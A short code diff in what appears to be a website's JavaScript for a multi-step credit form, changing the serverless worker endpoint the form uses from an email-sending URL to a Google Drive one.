@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     const form = document.getElementById('credit-form');
-    const WORKER_URL = 'https://send-email.devops-2aa.workers.dev/'; 
+    const WORKER_URL = 'https://send-google-drive.devops-2aa.workers.dev/'; 
 
     const steps = {
         step1: document.getElementById('step1'),
